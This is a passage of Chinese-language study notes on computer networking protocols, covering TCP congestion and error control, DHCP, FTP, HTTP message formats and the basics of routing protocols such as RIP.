title="拥塞控制："></a>拥塞控制：</h4><h5 id="拥塞控制与流量控制的对比"><a href="#拥塞控制与流量控制的对比" class="headerlink" title="拥塞控制与流量控制的对比:"></a>拥塞控制与流量控制的对比:</h5><blockquote><p style="color:blue;">出现资源拥塞的条件:    对资源需求的总和>可用资源</p></blockquote><ul><li>防止过多的数据注入到网络中，可以使路由器或者链路不至于过载。</li><li>拥塞控制是一个<strong>全局性</strong>的过程，涉及到所有的主机、路由器，以及与降低网络传输性能有关的所有因素。</li></ul><p><strong>流量控制：</strong>在给定的发送端和接收端之间的<strong>点对点通信量的控制</strong>。</p><ul><li>流量控制所要做的就是抑制发送端发送数据的速率，以便使接收端来得及接收</li></ul><h5 id="拥塞控制的作用："><a href="#拥塞控制的作用：" class="headerlink" title="拥塞控制的作用："></a>拥塞控制的作用：</h5><img src="./网际协议IP/拥塞控制.png" style="zoom:50%;" /><h5 id="拥塞控制方法"><a href="#拥塞控制方法" class="headerlink" title="拥塞控制方法"></a>拥塞控制方法</h5><blockquote><p style="color:black;">慢开始:        初始设置拥塞窗口cwnd = 1，每收到一个对新的报文段的确认后，将拥塞窗口加1，逐步增大发送端的拥塞窗口cwnd。</p></blockquote><blockquote><p style="color:black;">拥塞避免:    使拥塞窗口cwnd按线性规律缓慢增长，“加法增大”。</p></blockquote><img src="./网际协议IP/慢开始于拥塞避免.png" style="zoom:50%;" /><blockquote><p style="color:black;">快重传:接收方每收到一个失序的报文段后就立即发出重复确认，这样做可以让发送方及早知道有报文段没有到达接收方。发送方只要一连收到三个重复确认就应当立即重传对方尚未收到的报文段。</p></blockquote><img src="./网际协议IP/快重传.png" style="zoom:50%;" /><blockquote><p style="color:black;">快恢复:当发送端收到连续三个重复的确认时，就执行“乘法减小”算法，把慢开始门限ssthresh 减半，但接下去不执行慢开始算法，而是执行拥塞避免算法“加法增大”，使拥塞窗口缓慢地线性增大，实现快恢复。</p></blockquote><img src="./网际协议IP/快恢复.png" style="zoom:50%;" /><h5 id="发送窗口大小"><a href="#发送窗口大小" class="headerlink" title="发送窗口大小:"></a>发送窗口大小:</h5><p>考虑拥塞控制的情况下，窗口大小由接收窗口和拥塞窗口两者中的较小者决定。接收窗口大小由接收方发送的确认报文中的窗口大小字段值所确定。这是接收端在缓存溢出导致数据被丢弃之前所能接受的最大字节数。拥塞窗口大小是由网络根据拥塞情况而确定的。<br>发送窗口的上限值= Min [rwnd, cwnd]</p><blockquote><ul><li><p>当rwnd &lt; cwnd时，是接收方的接收能力限制发送窗口的最大值</p></li><li><p>当cwnd &lt; rwnd时，则是网络的拥塞限制发送窗口的最大值。</p></li></ul></blockquote><h4 id="差错控制："><a href="#差错控制：" class="headerlink" title="差错控制："></a>差错控制：</h4><h5 id="TCP的差错控制"><a href="#TCP的差错控制" class="headerlink" title="TCP的差错控制"></a>TCP的差错控制</h5><ul><li>应用程序把数据流交付给TCP后，就依靠TCP把整个数据流交付给接收端的应用程序，并且保证数据流是按序的、没有差错的、也没有任何一部分是丢失的或重复的。</li><li>TCP使用差错控制提供可靠性。差错控制包括以下的一些机制:检测受到损伤的报文、丢失的报文、失序的报文和重复的报文。</li></ul><blockquote><p style="color:blue;">实现方式：通过校验和、确认以及超时重传三种机制实现</p></blockquote><ul><li><p>校验和:用来检验报文是否出错，如果出错，接收端就将报文丢弃</p></li><li><p>确认</p><ul><li>累积确认：不必对收到的分组逐个发送确认，而是对按序到达的最后一个分组发送确认</li><li>选择确认：首部选项SACK用于报告收到的不连续的字节块的边界</li><li>确认报文不携带数据，但消耗一个序号。除了ACK报文之外，确认报文也需要被确认。</li></ul></li><li><p>重传</p><ul><li>超时计时器到时:发送端为每一个TCP报文段都设置一个超时计时器，若计时器到时仍没收到确认，就重传这个报文。超时计时器的值是动态的，根据报文的往返时间而更新</li><li>快重传:发送端只要一连收到三个重复的ACK即可断定有报文段丢失了，就应立即重传而不必等待计时器超时。</li></ul></li></ul><h2 id="动态主机配置协议DHCP"><a href="#动态主机配置协议DHCP" class="headerlink" title="动态主机配置协议DHCP"></a>动态主机配置协议DHCP</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">#掌握DHCP的报文格式</span><span class="token comment">#掌握DHCP的工作原理</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="DHCP简介："><a href="#DHCP简介：" class="headerlink" title="DHCP简介："></a>DHCP简介：</h4><blockquote><p style="color:blue;">动态主机配置协议(Dynamic Host Configuration Protocol )是一种动态指定IP地址的机制</p></blockquote><ul><li>DHCP服务器能自动为客户端分配IP地址，减少了客户机IP地址配置的复杂度和管理开销</li><li><strong>DHCP服务器</strong>是安装了DHCP服务器软件的计算机，可在网络中设置一台或多台</li></ul><p>分配给客户的IP是临时的，DHCP客户只能在有限的时间内使用该IP，这段时间称为<strong>租用期</strong><br>租用期的数值应由DHCP服务器决定(默认1小时)，DHCP客户也可在自己发送的报文中提出对租用期的要求。<br>当租期到了的时候，服务器可以把这个IP地址分配给别的主机使用。</p><blockquote><p style="color:orange;">DHCP使用UDP协议封装，使用UDP的熟知端口67和68，68是DHCP请求报文中的源端口，67是DHCP服务器的目标端口</p></blockquote><h4 id="DHCP报文格式："><a href="#DHCP报文格式：" class="headerlink" title="DHCP报文格式："></a>DHCP报文格式：</h4><img src="./网际协议IP/DHCP报文格式.png" style="zoom:50%;" /><blockquote><ol><li>操作码:1字节，表示是请求报文还是应答报文，1代表请求，2代表应答</li><li>硬件类型:1字节，表示正在使用的硬件技术的类型，1表示以太网。</li><li>硬件地址长度:1字节，如果是以太网，该字段值为6。</li><li>跳数:1字节，表示报文经过的DHCP中继的数目，请求报文每经过一个DHCP中继，该字段就加1。</li><li>事务ID:4字节，客户端发起一次请求时选择的随机数，服务器应答时返回客户同一个值，用来标识一次地址请求交互过程。</li><li>秒数:2字节，表示从客户端发出DHCP请求到现在所经过的秒数。</li><li>标志:2字节，第一个比特为广播响应标识位，用来标识dhcp服务器响应报文是采用单播还是广播发送。其余比特保留不用。</li><li>客户IP:4字节，如果客户已知道自己的IP，就写入，否则填入0。</li><li>你的IP:4字节，服务器分配给客户的IP。</li><li>服务器IP:4字节，由服务器填写，DHCP服务器的IP。</li><li>DHCP中继IP:4字节，客户发出请求后报文经过的第一个DHCP中继的IP。客户硬件地址:16字节，由客户端设置。</li><li>服务器主机名:64字节，由服务器填写。</li><li>引导文件名:由服务器为客户指定的配置文件名称。</li><li>选项:可选选项字段，包含报文的类型、有效租期、DNS服务器的IP地址、wins服务器的IP地址等配置信息，格式如下:</li></ol></blockquote><img src="./网际协议IP/DHCP协议封装.png" style="zoom:67%;" /><h4 id="静态地址分配与动态地址分配："><a href="#静态地址分配与动态地址分配：" class="headerlink" title="静态地址分配与动态地址分配："></a>静态地址分配与动态地址分配：</h4><h5 id="静态地址分配"><a href="#静态地址分配" class="headerlink" title="静态地址分配"></a>静态地址分配</h5><blockquote><p style="color:blue;">将物理地址与IP地址绑定在一起，DHCP服务器将这个绑定文件存放在静态数据库中。</p><p style="color:blue;">当有主机请求分配IP时，DHCP服务器首先检查静态数据库，若静态数据库存在所请求的物理地址条目，则将相应的IP地址返回给客户。</p></blockquote><h5 id="动态地址分配"><a href="#动态地址分配" class="headerlink" title="动态地址分配"></a>动态地址分配</h5><p>DHCP服务器有一个<strong>存放IP地址的数据库</strong>(IP地址池)。当客户请求临时IP地址时，DHCP服务器就查找可用的IP地址分配给客户。</p><blockquote><p style="color:orange;">从DHCP服务器获得的IP地址是临时的，服务器预设了租用时间，租用时间到期时，客户就更新租用或停止使用这个IP地址。</p></blockquote><p>服务器对更新租用可选择同意或不同意，如果不同意，客户就停止使用这个地址。</p><h4 id="DHCP状态转换"><a href="#DHCP状态转换" class="headerlink" title="DHCP状态转换"></a>DHCP状态转换</h4><img src="./网际协议IP/DHCP状态转换.png" style="zoom: 50%;" /><p><strong>一、初始化状态：</strong></p><ul><li>当DHCP客户端首次启动时，它处于初始化状态。客户使用向UDP端口67<strong>广播DHCPDISCOVER报文</strong>（带有DHCPDISCOVER选项的请求报文)。</li></ul><p><strong>二、选择状态：</strong></p><ul><li>发送DHCPDISCOVER报文后，客户就进入<strong>选择状态</strong>。收到请求报文的服务器用<strong>DHCPOFFER报文</strong>进行响应，提供了IP地址和租用时间，同时，服务器把提供的IP地址锁定，使这个地址不再提供给其它客户。</li><li>如果客户没有收到DHCPOFFER报文，它就再尝试4次，每次间隔2s，如果仍然没有应答，客户就睡眠300s后再试 </li></ul><p><strong>三、 请求状态 ：</strong></p><ul><li>客户选择多个DHCP服务器所提供的地址中的一个，并广播发送<strong>DHCPREQUEST报文</strong>，然后进入请求状态。</li><li>客户在请求状态等待，直到收到服务器的DHCPACK报文，然后客户进入绑定状态。 </li></ul><p><strong>四、绑定状态：</strong></p><ul><li>绑定状态下，客户在租用时间到期之前可以使用这个IP地址。当租用时间到达<strong>50%<strong>时，客户发送另一个DHCPREQUEST报文请求更新，进入</strong>更新状态</strong>。</li><li>在绑定状态，客户也可以使用<strong>DHCPRELEASE</strong>报文取消租用，进入初始化状态。</li></ul><p><strong>五、更新状态：</strong></p><ul><li><p>在更新状态下，如果客户收到更新租用的DHCPACK报文，就把计时器复位，然后回到绑定状态。</p></li><li><p>如果没有收到DHCPACK报文，且租用时间已到达87.5%，客户将再次向服务器发送DHCPREQUEST报文，进入重新绑定状态。 </p></li></ul><h4 id="DHCP运行过程"><a href="#DHCP运行过程" class="headerlink" title="DHCP运行过程"></a>DHCP运行过程</h4><p><strong>一、发现阶段：</strong></p><ul><li>DHCP客户寻找DHCP服务器的阶段。DHCP客户以广播方式发送DHCPDISCOVER报文来寻找DHCP服务器。</li></ul><img src="./网际协议IP/DHCP发现阶段.png" style="zoom:67%;" /><p><strong>二、提供阶段：</strong></p><ul><li><p>服务器向DHCP客户提供lP地址的阶段。网络中收到<strong>DHCPDISCOVER</strong>的DHCP服务器都会做出响应，从尚未出租的IP中挑选一个分配给客户，向客户发送一个包含出租的IP地址和其它设置的<strong>DHCPOFFER</strong>报文。</p><img src="./网际协议IP/DHCP提供阶段.png" style="zoom:67%;" /></li></ul><p><strong>三、选择阶段：</strong></p><ul><li><p>DHCP客户端选择某台DHCP服务器提供的IP地址的阶段。</p></li><li><p>如果有多台DHCP服务器向DHCP客户端发来的DHCPOFFER提供报文，则DHCP客户只接受第一个收到的DHCPOFFER提供报文，然后它就以广播方式回答一个DHCPREQUEST请求报文，该报文中包含向它所选定的DHCP服务器请求IP地址的内容。之所以要以广播方式回答，是为了通知所有的DHCP服务器，他将选择某台DHCP服务器所提供的IP地址。</p><img src="./网际协议IP/DHCP选择阶段.png" style="zoom: 80%;" /></li></ul><p><strong>四、确认阶段：</strong></p><ul><li><p>DHCP服务器确认所提供的IP地址的阶段</p></li><li><p>当DHCP服务器收到DHCP客户回答的DHCPREQUEST请求报文之后，它便向DHCP客户发送一个包含它所提供的IP地址和其它设置的DHCPACK确认报文，告诉DHCP客户可以使用它所提供的IP地址。然后DHCP客户便将其TCP/IP协议与网卡绑定，另外，除DHCP客户选中的服务器外，其它DHCP服务器都收回曾提供的IP地址</p><img src="./网际协议IP/DHCP确认阶段.png" style="zoom:80%;" /></li></ul><p><strong>五、重新登录：</strong></p><ul><li>以后DHCP客户每次重新登录网络时，就不需要再发送DHCPDISCOVER报文了，而是直接发送含有前一次所分配的IP地址的DHCPREQUEST请求报文。当服务器收到这一报文后，它会尝试让客户继续使用原来的IP地址，并回答一个DHCPACK确认报文。</li><li>如果此IP地址已无法再分配给原来的客户时，服务器给客户回答一个DHCPNACK否认报文。原来的客户收到否认报文后，必须重新发送DHCPDISCOVER报文来请求新的IP地址。</li></ul><p><strong>六、更新租约：</strong></p><ul><li>服务器给客户的IP地址有一个租借期限，期满后服务器会收回IP地址。如果客户要延长其IP租约，则必须更新租约。当时间到了租约期限的50%时，客户会自动向服务器发送更新其IP租约的DHCPREQUEST报文。</li></ul><h2 id="文件传输协议FTP"><a href="#文件传输协议FTP" class="headerlink" title="文件传输协议FTP"></a>文件传输协议FTP</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#掌握FTP的工作原理#掌握FTP常用命令的使用方法及用途<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="TFP简介："><a href="#TFP简介：" class="headerlink" title="TFP简介："></a>TFP简介：</h3><p><strong>FTP (File Transfer Protocol）服务：</strong></p><p>FTP是TCP/IP网络上两台计算机之间传送文件的协议，它是在Internet上最早使用的协议之一。</p><blockquote><p style="color:blue;">FTP客户机可以给服务器发出命令来下载文件、上传文件、创建或改变服务器上的目录</p></blockquote><ul><li>原来的FTP软件多是命令行操作，有了像Filezilla这样的图形界面软件，使用FTP传输变得方便易学。</li><li>大多数FTP服务面向大众，不需要身份认证，即“匿名FTP服务器”。</li></ul><blockquote><p style="color:orange;">FTP协议是应用层的协议，它基于运输层，负责进行文件的传输</p></blockquote><ul><li>FTP是一个8位的客户端-服务器协议，能操作任何类型的文件而不需要进一步处理。</li><li>FTP服务<strong>一般运行在TCP的20和21两个端口</strong>。端口20用于在客户端和服务器之间<strong>传输数据流</strong>，而端口21用于<strong>传输控制流</strong>，并且是命令通向ftp服务器的入口</li></ul><h3 id="两种TCP连接"><a href="#两种TCP连接" class="headerlink" title="两种TCP连接"></a>两种TCP连接</h3><blockquote><p>控制连接:建立之后一直持续到客户和服务器间的通信完成为止，用于传送控制命令，服务器使用21号端口</p></blockquote><blockquote><p>数据连接:根据通信的需要随时建立和释放，用于数据传输，服务器通常使用20号端口</p></blockquote><h5 id="控制连接"><a href="#控制连接" class="headerlink" title="控制连接:"></a>控制连接:</h5><p>创建步骤:服务器在熟知端口21发出被动打开，等待客户，客户使用临时端口发出主动打开。</p><img src="./网际协议IP/创建TCP连接.png" style="zoom:67%;" /><h5 id="数据连接："><a href="#数据连接：" class="headerlink" title="数据连接："></a>数据连接：</h5><ul><li><strong>主动模式</strong>(PORT)由服务器端向客户端发起数据连接</li><li><strong>被动模式</strong>(PASV)由客户端向服务器端发起数据连接</li></ul><blockquote><p style="color:orange;">主动模式是服务器主动连接客户的数据端口，被动模式是服务器被动地等待客户连接自己的数据端口</p></blockquote><h4 id="主动模式下的FTP服务"><a href="#主动模式下的FTP服务" class="headerlink" title="主动模式下的FTP服务"></a>主动模式下的FTP服务</h4><p><strong>PORT(主动)模式的默认数据端口是20，控制端口是21</strong></p><ul><li><strong>连接过程</strong><ul><li>连接时，客户端使用随机的端口N(N&gt;1024)连接服务器的控制端口21建立控制连接</li><li>然后客户端开放N+1号端口进行监听，并通过控制连接向服务器发送命令PORT N+1</li><li>服务器用自己的数据端口20连接到客户端的N+1端口，建立数据连接。</li></ul></li></ul><h5 id="主动模式存在的问题："><a href="#主动模式存在的问题：" class="headerlink" title="主动模式存在的问题："></a>主动模式存在的问题：</h5><blockquote><p style="color:orange;">PORT(主动)模式发送端口给服务器，由服务器连回客户端</p></blockquote><ol><li>如果客户端有防火墙，这样的连接会被认为是外部主机试图连接内部的主机，通常情况下是不允许的</li><li>为了解决这个问题，引入了PASV（被动）模式。</li></ol><h4 id="被动模式下的FTP服务"><a href="#被动模式下的FTP服务" class="headerlink" title="被动模式下的FTP服务"></a>被动模式下的FTP服务</h4><ul><li><p>连接过程</p><ul><li>连接时，客户端使用一个随机的端口N(N&gt;1024)连接服务器的21端口建立控制连接</li><li>通过控制连接向服务器发送命令PASV (被动模式)。</li><li>服务器使用一个随机的数据端口M(M&gt;1024)并通过控制连接发回客户端</li><li>客户端用数据端口N+1连接服务器的端口M。</li></ul><p>由于是客户端主动发起数据连接，这样就解决了防火墙带来的问题。</p></li></ul><h3 id="FTP通信："><a href="#FTP通信：" class="headerlink" title="FTP通信："></a>FTP通信：</h3><p><strong>控制连接上的通信：</strong>FTP使用NVT ASCII字符集在控制连接上通信。通信过程使用命令和响应来完成，命令和响应都是一个短行，因此不必考虑它的文件结构。每一行以回车换行结束</p><img src="./网际协议IP/FTP控制链路上的通信.png" style="zoom:50%;" /><p><strong>数据连接上的通信：</strong>在传送数据之前，客户使用控制连接来做传输准备，定义文件类型、数据结构、传输方式</p><img src="./网际协议IP/FTP数据连接上的通信.png" style="zoom:50%;" /><h4 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h4><ol><li>ASCII文件:传送文本文件的默认格式。每一个字符使用NVT ASCII进行编码。发送端把文件从它自己的表示转换成NVT ASCII字符，而接收端从NVT ASCII字符转换成它自己的字符</li><li>EBCDIC文件:若连接的一端或两端使用EBCDIC编码，则可使用EBCDIC编码传送文件</li><li>图像文件:传送二进制文件的默认格式。这种文件是作为连续的比特流传送而没有任何解释或编码。在大多数情况下它用来传送二进制文件，如已编译的程序。</li></ol><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><ul><li>文件结构（默认)︰这种文件没有结构，它是连续的字节流</li><li>记录结构:这种文件划分为一些记录，这只能用于文本文件</li><li>页面结构:这种文件划分为一些页面，每一个页面有页面号和页面首部。页面可以随机地或顺序地进行存取</li></ul><h4 id="传输方式"><a href="#传输方式" class="headerlink" title="传输方式"></a>传输方式</h4><blockquote><p>流方式:这是默认方式。数据作为连续的字节流从FTP交付给TCP。TCP负责把数据划分为适当大小的报文。若数据是简单的字节流（文件结构），就不需要文件结束符。若数据划分为记录（记录结构)，则每一个记录有1字节的记录结束（EOR）字符，而在文件的结束处有文件结束（EOF）字符。</p></blockquote><blockquote><p>块方式:数据可以按块从FTP交付给TCP。每一个块的前面有3字节首部。第一个字节叫做块描述符，后两个字节定义块的大小，以字节为单位。</p></blockquote><blockquote><p>压缩方式:若文件很大，数据可进行压缩。通常使用的压缩方法是游程长度编码。数据单元的连续出现数可以用一个“出现”和“重复数”来替换。在文本文件中，这通常是空格。在二进制文件中，空字符常常被压缩。</p></blockquote><h4 id="文件传送"><a href="#文件传送" class="headerlink" title="文件传送"></a>文件传送</h4><blockquote><p>从服务器把文件复制到客户端叫做<strong>读取</strong>文件，使用RETR命令完成</p></blockquote><blockquote><p>从客户端把文件复制到服务器叫做<strong>存储</strong>文件，使用STOR命令完成。</p></blockquote><p>从服务器向客户端发送目录列表或文件名，使用LIST命令完成。FTP把目录或文件名列表当作文件，在数据连接上发送。</p><img src="./网际协议IP/FTP文件传送.png" style="zoom:67%;" /><h3 id="FTP响应与命令："><a href="#FTP响应与命令：" class="headerlink" title="FTP响应与命令："></a>FTP响应与命令：</h3><blockquote><p style="color:blue;">FTP使用控制连接在客户进程和服务器进程之间完成交互操作，客户端向服务器发送命令，服务器给客户返回响应</p></blockquote><h5 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h5><ul><li>命令形式是ASCII大写字符，后面的变量可以有，也可以没有。</li><li>命令可以粗略地划分为6组:接口命令、文件管理命令、数据格式化命端口定义命令、文件传送命令以及杂项命令。</li></ul><img src="./网际协议IP/FTP命令.png" style="zoom: 50%;" /><h5 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h5><blockquote><p style="color:blue;">每一个FTP命令都应该有响应。响应由两个部分组成:3个数字以及跟随在后面的文本。数字部分定义代码，文本部分定义所需的参数或额外的解释</p></blockquote><img src="./网际协议IP/FTP相应.png" style="zoom:67%;" /><h2 id="超文本传输协议HTTP"><a href="#超文本传输协议HTTP" class="headerlink" title="超文本传输协议HTTP"></a>超文本传输协议HTTP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#掌握HTTP的报文格式</span><span class="token comment">#掌握HTTP的工作原理</span><span class="token comment">#掌握HTTP常用方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="万维网体系结构"><a href="#万维网体系结构" class="headerlink" title="万维网体系结构"></a>万维网体系结构</h3><p>万维网，全称为World Wide Web，是一个由许多互相链接的超文本组成的系统，通过互联网访问。</p><ul><li>在这个系统中，每个有用的事物，称为“资源”，由全局“统一资源标识符(URL)”标识;这些资源通过超文本传输协议传送给用户，用户通过点击超链接来获得资源</li><li>每一个网站保存有一个或多个文档，叫做万维网页面。浏览器用来读取万维网上的文档<ul><li>客户需要查看网站A的某些信息，它向网站A发送一个请求，请求包含了网站A和其中万维网页面的地址，称为统一资源定位符(URL)</li><li>网站A收到请求后，将指定的文档发送给这个客户。</li></ul></li></ul><img src="./网际协议IP/用户访问万维网示意图.png" style="zoom:67%;" /><center>用户访问万维网的示意图</center>> <p style="color:orange;">WWW服务是分布式的客户/服务器模式</p><p><strong>浏览器：</strong>客户端程序，可以解释和显示万维网页面。</p><p><strong>服务器：</strong></p><blockquote><ul><li>万维网页面存储在服务器上，当客户请求到达时，对应的页面就发送给客户</li><li>为了提高效率，服务器通常在其高速缓存中存放被请求过的页面</li><li>通过多线程或多进程可使服务器的效率更加提高，服务器在同一时间可回答多个请求</li></ul></blockquote><h4 id="统一资源定位符（URL"><a href="#统一资源定位符（URL" class="headerlink" title="统一资源定位符（URL)"></a>统一资源定位符（URL)</h4><blockquote><p style="color:orange;">Uniform Resource Locator，用于表示Internet上资源的位置和访问方法</p></blockquote><ul><li><p>URL由4部分组成:</p><ol><li><p><strong>协议</strong>:指定了用这个URL的客户/服务器程序。如，HTTP、FTP和TELNET等</p></li><li><p>主机:指明了信息所存放的地址，可以是逻辑地址也可以是相应的域名</p></li><li><p>端口:指定了使用主机的某个端口，端口是可选的。</p><blockquote><p style="color:blue;">如果包含了端口，那么端口就插入在主机和路径之间，和主机用冒号分隔开</p></blockquote></li><li><p>路径:指定了文件存放的位置。路径本身可以包含斜线，用于将目录与子目录和文件分隔开。</p></li></ol></li></ul><img src="./网际协议IP/统一资源定位符.png" style="zoom:50%;" /><center>统一资源定位符格式:</center>##### 静态文档<p>内容固定的文档，由服务器创建。文档的内容是在创建文档时就确定的，而不是在使用它时。</p><h5 id="动态文档"><a href="#动态文档" class="headerlink" title="动态文档"></a>动态文档</h5><p>在浏览器请求该文档时才由万维网服务器创建出来。当请水到丛的，力维网服务器就运行创建动态文档的应用程序。服务器返回这个程序或脚本的输出，把它作为对请求该文档的浏览器的响应。<br>对每个请求都创建出新的文档，所以每个请求得到的动态文档内容可能不同。</p><h5 id="活动文档"><a href="#活动文档" class="headerlink" title="活动文档"></a>活动文档</h5><p>有些文档需要程序在客户端运行，称为活动文档。当浏览器请求活动文档时，服务器就发送这个文档的一个副本或脚本，然后这个文档就在客户（浏览器)端运行。</p><h3 id="HTTP报文格式："><a href="#HTTP报文格式：" class="headerlink" title="HTTP报文格式："></a>HTTP报文格式：</h3><p>超文本传输协议，Hyperlext Transfer Protocol，用于访问万维网上的数据</p><p>它是一种详细规定了浏览器和万维网服务器之间互相通信的规则，通过因特网传送万维网文档的数据传送协议。<br>协议以普通文本、超文本、音频、视频等格式传输数据，它可以快速的在文档之间跳转</p><ul><li><blockquote><p style="color:orange;">HTTP是一个应用层协议，它使用TCP连接进行可靠的传送，在熟知端口80上提供服务。</p></blockquote></li></ul><blockquote><p style="color:black;">HTTP报文有两种类型:请求报文和响应报文</p>- 两种报文格式只有开始行不同。</blockquote><ul><li><p>首部行</p><ul><li>用来说明浏览器、服务器或报文主体的一些信息。</li><li>由关键字/值对组成，每行一对，关键字和值用英文冒号“:”分隔，结束的地方都要有回车换行</li><li>首部可以有好几行，但也可以不使用。</li><li>整个首部行结束时，还要有一个空行将首部行和后面的实体主体分</li></ul></li><li><p>实体主体</p><ul><li>在请求报文中一般不用，而在响应报文中也可能没有这个字段</li></ul></li></ul><h4 id="HTTP请求报文："><a href="#HTTP请求报文：" class="headerlink" title="HTTP请求报文："></a>HTTP请求报文：</h4><img src="./网际协议IP/HTTP请求报文.png" style="zoom:67%;" /><ul><li><p>方法:</p><ul><li><p>常见的有GET和POST方法，在地址栏中输入网址访问网页时，浏览器采用GET方法向服务器获取资源，POST方法要求服务器接受附在请求后面的数据，常用于提交表单。</p><img src="./网际协议IP/HTTP方法.png" style="zoom:67%;" /></li></ul></li><li><p>URL:向服务器请求的资源</p></li><li><p>HTTP版本:目前是http/1.1。</p></li><li><p>首部字段：</p><ul><li>Accept:指定客户端接受哪些类型的信息，如text/html,image/gif等</li><li>Accept-Language:指定一种自然语言。</li><li>Accept-Encoding:指定可接受的内容编码，如gzip, deflate。</li><li>User-Agent: 允许客户端将它的操作系统、浏览器和其它属性告诉服务器</li><li>Host:目标服务器</li><li>Connection:连接状态，如Keep-Alive，Close。</li></ul></li></ul><h4 id="HTTP回应报文"><a href="#HTTP回应报文" class="headerlink" title="HTTP回应报文"></a>HTTP回应报文</h4><img src="./网际协议IP/HTTP回应报文.png" style="zoom:67%;" /><ul><li><p>版本:与请求报文相同</p></li><li><p>状态码:表示服务器的响应类型，有三位数字组成，其中第一个数字定义了响应的类别，有五种可能取值:</p><blockquote><ul><li>1xx:通知信息—表示请求已接收，继续处理</li><li>2xx:成功—表示请求已被成功接收、理解、接受</li><li>3xx:重定向一用于已经移动的文件</li><li>4xx:客户端错误—请求有语法错误或请求无法实现</li><li>5xx:服务器端错误—服务器失效无法完成请求</li></ul></blockquote></li></ul><img src="./网际协议IP/HTTP协议状态码.png" style="zoom: 50%;" /><center>HTTP协议状态码：</center>- 短语:解释状态码的简单短语- 首部字段  - Date:消息产生时间  - Server:服务器用来处理请求的软件  - Set- cookie:设置Cookie及其路径  - Content-Length:实体正文的长度，十进制  - Connection:连接状态。  - Content-Type:发送给接收者的实体正文的媒体类型，如Content-Type:text/html;charset=GB2312。<h3 id="持久与非持久链接"><a href="#持久与非持久链接" class="headerlink" title="持久与非持久链接"></a>持久与非持久链接</h3><h4 id="非持久连接"><a href="#非持久连接" class="headerlink" title="非持久连接"></a>非持久连接</h4><ul><li>对每一个请求/响应都要建立一次TCP连接</li><li>非持久连接策略给服务器造成了很大的开销，因为服务器需要N个不同的缓存，而每次打开连接时都要使用慢开始过程</li><li>版本1.1以前的HTTP协议默认是非持久连接</li></ul><h4 id="持久连接"><a href="#持久连接" class="headerlink" title="持久连接"></a>持久连接</h4><ul><li><p>在使用持久连接时，服务器在发送响应后，让连接继续为一些请求打开</p></li><li><p>服务器可以在客户发送关闭请求时等待或关闭这个连接。</p></li><li><p>服务器可在相同的TCP连接上向客户发送多个对象</p><blockquote><p>HTTP版本1.1默认使用持久连接策略。</p></blockquote></li></ul><h3 id="万维网的工作过程："><a href="#万维网的工作过程：" class="headerlink" title="万维网的工作过程："></a>万维网的工作过程：</h3><p>每个万维网网点都有一个服务器,它不断地监听TCP的端口80，以便发现是否有浏览器（即万维网客户)向它发出连接建立请求。一旦监听到连接请求并建立了TCP连接之后，浏览器就向万维网服务器发出浏览某个页面的请求，服务器接着就返回所请求的页面作为响应。最后释放TCP连接。</p><img src="./网际协议IP/万维网工作过程.png" style="zoom:67%;" /><h2 id="路由信息协议RIP"><a href="#路由信息协议RIP" class="headerlink" title="路由信息协议RIP"></a>路由信息协议RIP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#掌握路由协议的分类，理解静态路由和动态路由</span><span class="token comment">#掌握动态路由协议RIP的报文格式、工作原理及工作过程</span><span class="token comment">#掌握RIP计时器的作用</span><span class="token comment">#理解RIP的稳定性</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="一、路由分类："><a href="#一、路由分类：" class="headerlink" title="一、路由分类："></a>一、路由分类：</h3><h4 id="静态路由与动态路由："><a href="#静态路由与动态路由：" class="headerlink" title="静态路由与动态路由："></a>静态路由与动态路由：</h4><h5 id="路由选择"><a href="#路由选择" class="headerlink" title="路由选择:"></a>路由选择:</h5><blockquote><p>在从源点到终点的通信过程中，数据包可能经过多个路由器，直到到达连接，目的网络路由器为止。<br>当路由器收到数据包时，它应当将数据包转发到哪一个网络，取决于路由表的信息。</p></blockquote><h5 id="路由表"><a href="#路由表" class="headerlink" title="路由表:"></a>路由表:</h5><blockquote><p>静态路由表:路由信息是管理员设置的，并由管理员手动进行更新。</p></blockquote><blockquote><p>动态路由表:路由信息是随着互联网的变化而自动更新的。</p></blockquote><p>**路由选择协议:**路由选择协议是一些规则和过程的组合。规则使得路由器之间能够共享他们所知道的互联网情况和邻站信息，而过程用来合并从其它路由器收到的信息。</p><h4 id="外部和内部路由选择："><a href="#外部和内部路由选择：" class="headerlink" title="外部和内部路由选择："></a>外部和内部路由选择：</h4><p><strong>自治系统（AS,Autonomous System)</strong><br>由同一个管理机构管理、使用统一路由策略的路由器的集合。<br>最初，自治系统内部只考虑运行单个路由协议;然而，随着网络的发展，一个自治系统内现在也可以支持同时运行多种路由协议</p><img src="./网际协议IP/自治系统.png" style="zoom:67%;" /><h5 id="两大类路由选择协议"><a href="#两大类路由选择协议" class="headerlink" title="两大类路由选择协议"></a>两大类路由选择协议</h5><p><strong>内部网关协议IGP(Interior Gateway Protocol)：</strong></p><blockquote><p style="color:blue;">内部网关协议IGP(Interior Gateway Protocol):在一个自治系统内部使用的路由选择协议</p>- 目前这类路由选择(域内路由选择)协议使用得最多，如**RIP**和**OSPF协议**。</blockquote><p><strong>外部网关协议EGP(External Gateway Protocol):</strong></p><blockquote><p style="color:blue;">外部网关协议EGP(External Gateway Protocol):在自治系统之间使用的路由选择协议</p>- 在外部网关协议中目前使用最多的是**BGP-4**协议</blockquote><h5 id="距离向量路由选择协议"><a href="#距离向量路由选择协议" class="headerlink" 